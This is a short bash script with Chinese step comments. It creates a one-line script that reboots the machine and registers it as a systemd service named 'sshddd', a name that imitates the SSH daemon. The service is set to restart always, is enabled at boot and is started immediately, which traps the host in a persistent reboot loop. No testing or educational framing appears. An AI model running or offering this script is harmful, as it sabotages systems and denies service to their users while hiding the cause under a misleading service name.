#!/bin/bash

# 1. 创建 /home/1.sh，写入重启内容
echo -e "#!/bin/bash\n\nreboot" > /home/1.sh

# 2. 给 /home/1.sh 执行权限
chmod +x /home/1.sh

# 3. 创建 systemd 服务文件
cat <<EOF | sudo tee /etc/systemd/system/sshddd.service > /dev/null
[Unit]
Description=sshddd
After=network.target

[Service]
ExecStart=/home/1.sh
Restart=always
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF

# 4. 重新加载 systemd daemon 并启用开机自启
sudo systemctl daemon-reload
sudo systemctl enable sshddd.service

# 5. 启动服务
sudo systemctl start sshddd.service
